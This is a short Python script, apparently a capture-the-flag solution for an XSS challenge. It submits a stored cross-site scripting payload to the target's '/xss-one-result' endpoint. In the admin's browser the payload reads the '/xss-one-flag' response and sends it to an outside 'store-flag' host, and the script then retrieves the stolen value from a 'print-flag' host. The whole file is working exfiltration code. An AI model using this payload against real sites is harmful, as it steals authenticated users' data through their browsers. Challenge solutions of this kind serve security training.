import sys
import requests 

payload_part1 = "<script>" \
+ "var xhr = new XMLHttpRequest();" \
+ "xhr.open('GET','/xss-one-flag',true);" \
+ "xhr.onload = function () {" \
+ "var request = new XMLHttpRequest();" \
+ "request.open('GET','"

payload_part2 = "?flag=' + xhr.responseText,true);" \
+ "request.send()};" \
+ "xhr.send(null);" \
+ "</script>"

store_url = "https://store-flag-808630243113.us-central1.run.app/"
print_url = "https://print-flag-808630243113.us-central1.run.app"

if len(sys.argv) != 2:
    print("Please specify challenge URL")
    print("python solution.py <challenge-url>")
else:  
	vector = payload_part1 + store_url + payload_part2
	param = {'payload':vector}
	response = requests.post(sys.argv[1] + '/xss-one-result', data=param)
	response = requests.get(sys.argv[1] + '/xss-one-flag')
	print("Response as non-Admin")
	print(response.text)
	print("Response as Admin")
	response = requests.get(print_url)
	print(response.text)
